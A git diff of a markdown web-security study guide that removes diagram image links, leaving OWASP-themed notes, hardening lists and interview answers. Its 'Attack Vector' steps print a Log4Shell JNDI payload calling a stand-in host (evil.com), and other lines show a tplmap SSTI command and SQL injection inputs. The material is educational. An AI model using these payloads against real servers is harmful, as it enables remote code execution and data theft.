-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/exploitation-phase-diagram.svg" alt="Diagram: Exploitation Phase" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/exploitation-phase-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/exploitation-phase-sticky.svg" alt="Sticky Note: Exploitation Phase" width="30%">
-</a>
-
 
 
 ```text
@@ -1150,16 +869,6 @@ SSTI:    tplmap -u "http://target.com/greet?name=*"
 ```
 
 ### Reporting Phase
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/reporting-phase-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/reporting-phase-handwritten.svg" alt="Handwritten: Reporting Phase" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/reporting-phase-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/reporting-phase-diagram.svg" alt="Diagram: Reporting Phase" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/reporting-phase-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/reporting-phase-sticky.svg" alt="Sticky Note: Reporting Phase" width="30%">
-</a>
 
 
 
@@ -1175,16 +884,6 @@ SSTI:    tplmap -u "http://target.com/greet?name=*"
 
 ### Golden Rules
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/golden-rules-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/golden-rules-handwritten.svg" alt="Handwritten: Golden Rules" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/golden-rules-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/golden-rules-diagram.svg" alt="Diagram: Golden Rules" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/golden-rules-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/golden-rules-sticky.svg" alt="Sticky Note: Golden Rules" width="30%">
-</a>
-
 
 - Never automate without throttle (DoS = ban)
 - Always scope first (in-scope vs out-of-scope)
@@ -1198,16 +897,6 @@ SSTI:    tplmap -u "http://target.com/greet?name=*"
 **Real-World Analogy:** A house built with bedroom doors that only lock from the outside.
 **Technical Explanation:** Security flaws exist in the architecture, not just the implementation. Missing threat modeling, lack of rate limiting, improper trust boundaries.
 ### Common Insecure Design Patterns
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/common-insecure-design-patterns-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/common-insecure-design-patterns-handwritten.svg" alt="Handwritten: Common Insecure Design Patterns" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/common-insecure-design-patterns-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/common-insecure-design-patterns-diagram.svg" alt="Diagram: Common Insecure Design Patterns" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/common-insecure-design-patterns-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/common-insecure-design-patterns-sticky.svg" alt="Sticky Note: Common Insecure Design Patterns" width="30%">
-</a>
 
 
 | Pattern | Description | Example |
@@ -1226,16 +915,6 @@ SSTI:    tplmap -u "http://target.com/greet?name=*"
 
 ### Defense
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/defense-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/defense-handwritten.svg" alt="Handwritten: Defense" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/defense-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/defense-diagram.svg" alt="Diagram: Defense" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/defense-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/defense-sticky.svg" alt="Sticky Note: Defense" width="30%">
-</a>
-
 
 - Threat modeling (STRIDE, PASTA) during design phase
 - Rate limiting by default on all endpoints
@@ -1249,16 +928,6 @@ SSTI:    tplmap -u "http://target.com/greet?name=*"
 
 **Real-World Analogy:** A bank vault with the combination still set to 0000.
 ### Common Misconfigurations
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/common-misconfigurations-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/common-misconfigurations-handwritten.svg" alt="Handwritten: Common Misconfigurations" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/common-misconfigurations-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/common-misconfigurations-diagram.svg" alt="Diagram: Common Misconfigurations" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/common-misconfigurations-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/common-misconfigurations-sticky.svg" alt="Sticky Note: Common Misconfigurations" width="30%">
-</a>
 
 
 | Misconfiguration | Risk | Detection |
@@ -1278,16 +947,6 @@ SSTI:    tplmap -u "http://target.com/greet?name=*"
 | CORS misconfiguration | Cross-origin data theft | Access-Control-Allow-Origin: * |
 
 ### Secure Hardening Checklist
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-hardening-checklist-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-hardening-checklist-handwritten.svg" alt="Handwritten: Secure Hardening Checklist" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-hardening-checklist-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-hardening-checklist-diagram.svg" alt="Diagram: Secure Hardening Checklist" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-hardening-checklist-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-hardening-checklist-sticky.svg" alt="Sticky Note: Secure Hardening Checklist" width="30%">
-</a>
 
 
 
@@ -1312,32 +971,12 @@ SSTI:    tplmap -u "http://target.com/greet?name=*"
 **Real-World Analogy:** Building a house on a cracked foundation.
 ### Attack Vector
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-vector-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-vector-handwritten.svg" alt="Handwritten: Attack Vector" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-vector-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-vector-diagram.svg" alt="Diagram: Attack Vector" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-vector-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-vector-sticky.svg" alt="Sticky Note: Attack Vector" width="30%">
-</a>
-
 
 1. Identify version: curl -H "X-Api-Version: 1.0" http://target.com
 2. Match to CVE: CVE-2021-44228 (Log4Shell) for Log4j 2.0-2.14.1
 3. Exploit: ${jndi:ldap://evil.com/a} in User-Agent header
 4. RCE achieved on vulnerable server
 ### SBOM (Software Bill of Materials) Example
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/sbom-software-bill-of-materials-example-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/sbom-software-bill-of-materials-example-handwritten.svg" alt="Handwritten: SBOM (Software Bill of Materials) Example" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/sbom-software-bill-of-materials-example-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/sbom-software-bill-of-materials-example-diagram.svg" alt="Diagram: SBOM (Software Bill of Materials) Example" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/sbom-software-bill-of-materials-example-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/sbom-software-bill-of-materials-example-sticky.svg" alt="Sticky Note: SBOM (Software Bill of Materials) Example" width="30%">
-</a>
 
 
 
@@ -1355,16 +994,6 @@ SSTI:    tplmap -u "http://target.com/greet?name=*"
 
 ### Mitigation
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-handwritten.svg" alt="Handwritten: Mitigation" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-diagram.svg" alt="Diagram: Mitigation" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-sticky.svg" alt="Sticky Note: Mitigation" width="30%">
-</a>
-
 
 - Maintain SBOM for all projects
 - Run npm audit, mvn dependency-check, or OWASP Dependency-Check
@@ -1378,16 +1007,6 @@ SSTI:    tplmap -u "http://target.com/greet?name=*"
 
 **Real-World Analogy:** A door lock that accepts any key.
 ### Common Failures
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/common-failures-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/common-failures-handwritten.svg" alt="Handwritten: Common Failures" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/common-failures-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/common-failures-diagram.svg" alt="Diagram: Common Failures" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/common-failures-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/common-failures-sticky.svg" alt="Sticky Note: Common Failures" width="30%">
-</a>
 
 
 | Failure | Example | Exploit |
@@ -1410,16 +1029,6 @@ SSTI:    tplmap -u "http://target.com/greet?name=*"
 
 ### Session Management
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/session-management-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/session-management-handwritten.svg" alt="Handwritten: Session Management" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/session-management-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/session-management-diagram.svg" alt="Diagram: Session Management" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/session-management-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/session-management-sticky.svg" alt="Sticky Note: Session Management" width="30%">
-</a>
-
 
 
 ```java
@@ -1434,16 +1043,6 @@ response.addCookie(sessionCookie);
 ```
 
 ### Secure Authentication Code
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-authentication-code-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-authentication-code-handwritten.svg" alt="Handwritten: Secure Authentication Code" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-authentication-code-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-authentication-code-diagram.svg" alt="Diagram: Secure Authentication Code" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-authentication-code-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-authentication-code-sticky.svg" alt="Sticky Note: Secure Authentication Code" width="30%">
-</a>
 
 
 
@@ -1474,16 +1073,6 @@ public ResponseEntity<?> login(@RequestBody LoginRequest req, HttpServletRequest
 **Real-World Analogy:** Ordering medicine from a website that does not verify the pills are genuine.
 ### Integrity Through SRI
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/integrity-through-sri-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/integrity-through-sri-handwritten.svg" alt="Handwritten: Integrity Through SRI" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/integrity-through-sri-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/integrity-through-sri-diagram.svg" alt="Diagram: Integrity Through SRI" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/integrity-through-sri-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/integrity-through-sri-sticky.svg" alt="Sticky Note: Integrity Through SRI" width="30%">
-</a>
-
 
 
 ```html
@@ -1501,16 +1090,6 @@ public ResponseEntity<?> login(@RequestBody LoginRequest req, HttpServletRequest
 
 **Real-World Analogy:** A bank with no cameras or alarms.
 ### What to Log
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-to-log-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-to-log-handwritten.svg" alt="Handwritten: What to Log" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-to-log-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-to-log-diagram.svg" alt="Diagram: What to Log" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-to-log-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-to-log-sticky.svg" alt="Sticky Note: What to Log" width="30%">
-</a>
 
 
 | Event | Example | Log Level |
@@ -1531,31 +1110,11 @@ public ResponseEntity<?> login(@RequestBody LoginRequest req, HttpServletRequest
 
 ### What NOT to Log
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-not-to-log-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-not-to-log-handwritten.svg" alt="Handwritten: What NOT to Log" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-not-to-log-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-not-to-log-diagram.svg" alt="Diagram: What NOT to Log" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-not-to-log-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-not-to-log-sticky.svg" alt="Sticky Note: What NOT to Log" width="30%">
-</a>
-
 
 - Passwords, secrets, tokens, credit card numbers
 - Full request bodies for sensitive endpoints
 - Session IDs in logs (use hashed identifiers)
 ### Secure Logging Code
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-logging-code-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-logging-code-handwritten.svg" alt="Handwritten: Secure Logging Code" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-logging-code-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-logging-code-diagram.svg" alt="Diagram: Secure Logging Code" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-logging-code-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-logging-code-sticky.svg" alt="Sticky Note: Secure Logging Code" width="30%">
-</a>
 
 
 
@@ -1582,16 +1141,6 @@ public class SecurityLoggingAspect {
 
 ### Incident Response Time
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/incident-response-time-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/incident-response-time-handwritten.svg" alt="Handwritten: Incident Response Time" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/incident-response-time-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/incident-response-time-diagram.svg" alt="Diagram: Incident Response Time" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/incident-response-time-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/incident-response-time-sticky.svg" alt="Sticky Note: Incident Response Time" width="30%">
-</a>
-
 
 
 ```text
@@ -1611,16 +1160,6 @@ Industry benchmarks:
 
 ### E-Commerce (Amazon, eBay)
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/e-commerce-amazon-ebay-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/e-commerce-amazon-ebay-handwritten.svg" alt="Handwritten: E-Commerce (Amazon, eBay)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/e-commerce-amazon-ebay-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/e-commerce-amazon-ebay-diagram.svg" alt="Diagram: E-Commerce (Amazon, eBay)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/e-commerce-amazon-ebay-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/e-commerce-amazon-ebay-sticky.svg" alt="Sticky Note: E-Commerce (Amazon, eBay)" width="30%">
-</a>
-
 
 | Vulnerability | Impact |
 
@@ -1635,16 +1174,6 @@ Industry benchmarks:
 | SSRF | Probe internal AWS metadata |
 
 ### Banking (PayPal, Stripe)
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/banking-paypal-stripe-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/banking-paypal-stripe-handwritten.svg" alt="Handwritten: Banking (PayPal, Stripe)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/banking-paypal-stripe-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/banking-paypal-stripe-diagram.svg" alt="Diagram: Banking (PayPal, Stripe)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/banking-paypal-stripe-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/banking-paypal-stripe-sticky.svg" alt="Sticky Note: Banking (PayPal, Stripe)" width="30%">
-</a>
 
 
 | Vulnerability | Impact |
@@ -1661,16 +1190,6 @@ Industry benchmarks:
 
 ### Healthcare (Patient Portals)
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/healthcare-patient-portals-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/healthcare-patient-portals-handwritten.svg" alt="Handwritten: Healthcare (Patient Portals)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/healthcare-patient-portals-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/healthcare-patient-portals-diagram.svg" alt="Diagram: Healthcare (Patient Portals)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/healthcare-patient-portals-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/healthcare-patient-portals-sticky.svg" alt="Sticky Note: Healthcare (Patient Portals)" width="30%">
-</a>
-
 
 | Vulnerability | Impact |
 
@@ -1684,16 +1203,6 @@ Industry benchmarks:
 
 ### Social Media (Facebook, Twitter)
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/social-media-facebook-twitter-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/social-media-facebook-twitter-handwritten.svg" alt="Handwritten: Social Media (Facebook, Twitter)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/social-media-facebook-twitter-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/social-media-facebook-twitter-diagram.svg" alt="Diagram: Social Media (Facebook, Twitter)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/social-media-facebook-twitter-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/social-media-facebook-twitter-sticky.svg" alt="Sticky Note: Social Media (Facebook, Twitter)" width="30%">
-</a>
-
 
 | Vulnerability | Impact |
 
@@ -1706,16 +1215,6 @@ Industry benchmarks:
 | Open Redirect | Phishing campaigns |
 
 ### Cloud Platforms (AWS, GCP, Azure)
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/cloud-platforms-aws-gcp-azure-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/cloud-platforms-aws-gcp-azure-handwritten.svg" alt="Handwritten: Cloud Platforms (AWS, GCP, Azure)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/cloud-platforms-aws-gcp-azure-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/cloud-platforms-aws-gcp-azure-diagram.svg" alt="Diagram: Cloud Platforms (AWS, GCP, Azure)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/cloud-platforms-aws-gcp-azure-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/cloud-platforms-aws-gcp-azure-sticky.svg" alt="Sticky Note: Cloud Platforms (AWS, GCP, Azure)" width="30%">
-</a>
 
 
 | Vulnerability | Impact |
@@ -1734,211 +1233,61 @@ Industry benchmarks:
 
 ### Q1: What is the OWASP Top 10 and why is it important?
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-owasp-top-10-and-why-is-it-important-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-owasp-top-10-and-why-is-it-important-handwritten.svg" alt="Handwritten: What is the OWASP Top 10 and why is it important?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-owasp-top-10-and-why-is-it-important-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-owasp-top-10-and-why-is-it-important-diagram.svg" alt="Diagram: What is the OWASP Top 10 and why is it important?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-owasp-top-10-and-why-is-it-important-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-owasp-top-10-and-why-is-it-important-sticky.svg" alt="Sticky Note: What is the OWASP Top 10 and why is it important?" width="30%">
-</a>
-
 
 **Answer:** The OWASP Top 10 is a consensus list of the most critical web application security risks, updated every 3-4 years. It provides a standardized framework for prioritizing security efforts. The 2021 edition introduced risk scores and categorized vulnerabilities by root cause. It gives development and security teams a common language and a ranked starting point for security programs.
 ### Q2: Explain SQL Injection and how to prevent it.
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/explain-sql-injection-and-how-to-prevent-it-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/explain-sql-injection-and-how-to-prevent-it-handwritten.svg" alt="Handwritten: Explain SQL Injection and how to prevent it." width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/explain-sql-injection-and-how-to-prevent-it-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/explain-sql-injection-and-how-to-prevent-it-diagram.svg" alt="Diagram: Explain SQL Injection and how to prevent it." width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/explain-sql-injection-and-how-to-prevent-it-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/explain-sql-injection-and-how-to-prevent-it-sticky.svg" alt="Sticky Note: Explain SQL Injection and how to prevent it." width="30%">
-</a>
 
 
 **Answer:** SQL Injection occurs when user input is concatenated into SQL queries as executable code rather than data. An attacker inputs `OR 1=1` to bypass authentication or `UNION SELECT` to extract data. Prevention: always use parameterized queries/prepared statements, apply least-privilege DB permissions, and never concatenate user input into SQL strings.
 ### Q3: What is the difference between Reflected, Stored, and DOM-based XSS?
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-difference-between-reflected-stored-and-dom-based-xss-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-difference-between-reflected-stored-and-dom-based-xss-handwritten.svg" alt="Handwritten: What is the difference between Reflected, Stored, and DOM-based XSS?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-difference-between-reflected-stored-and-dom-based-xss-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-difference-between-reflected-stored-and-dom-based-xss-diagram.svg" alt="Diagram: What is the difference between Reflected, Stored, and DOM-based XSS?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-difference-between-reflected-stored-and-dom-based-xss-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-difference-between-reflected-stored-and-dom-based-xss-sticky.svg" alt="Sticky Note: What is the difference between Reflected, Stored, and DOM-based XSS?" width="30%">
-</a>
-
 
 **Answer:** Reflected XSS: payload comes from the current HTTP request (typically URL), echoed by the server without encoding. Stored XSS: payload stored on the server (database, comment, profile) and served to all visitors → most dangerous. DOM-based XSS: vulnerability exists solely in client-side JavaScript → server never sees the payload. All three execute in the victim's browser context.
 ### Q4: How does Content Security Policy (CSP) prevent XSS?
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/how-does-content-security-policy-csp-prevent-xss-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/how-does-content-security-policy-csp-prevent-xss-handwritten.svg" alt="Handwritten: How does Content Security Policy (CSP) prevent XSS?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/how-does-content-security-policy-csp-prevent-xss-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/how-does-content-security-policy-csp-prevent-xss-diagram.svg" alt="Diagram: How does Content Security Policy (CSP) prevent XSS?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/how-does-content-security-policy-csp-prevent-xss-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/how-does-content-security-policy-csp-prevent-xss-sticky.svg" alt="Sticky Note: How does Content Security Policy (CSP) prevent XSS?" width="30%">
-</a>
 
 
 **Answer:** CSP is an HTTP header that tells the browser which sources are trusted for scripts, styles, images, etc. `script-src 'self'` blocks all inline scripts and external scripts from untrusted origins. With a nonce-based CSP, only script tags with the matching nonce attribute execute. CSP acts as a powerful defense-in-depth layer.
 ### Q5: What is CSRF and how do you prevent it?
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-csrf-and-how-do-you-prevent-it-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-csrf-and-how-do-you-prevent-it-handwritten.svg" alt="Handwritten: What is CSRF and how do you prevent it?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-csrf-and-how-do-you-prevent-it-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-csrf-and-how-do-you-prevent-it-diagram.svg" alt="Diagram: What is CSRF and how do you prevent it?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-csrf-and-how-do-you-prevent-it-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-csrf-and-how-do-you-prevent-it-sticky.svg" alt="Sticky Note: What is CSRF and how do you prevent it?" width="30%">
-</a>
-
 
 **Answer:** Cross-Site Request Forgery tricks an authenticated user into performing unintended actions by crafting a request from another site. Browsers automatically include cookies, so the server sees a valid authenticated request. Prevention: (1) Anti-CSRF tokens, (2) SameSite cookies, (3) Custom headers, (4) Origin/Referer validation.
 ### Q6: What is SSRF and what is the impact?
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-ssrf-and-what-is-the-impact-handwritten.svg" target="_blank" rel="noopener">
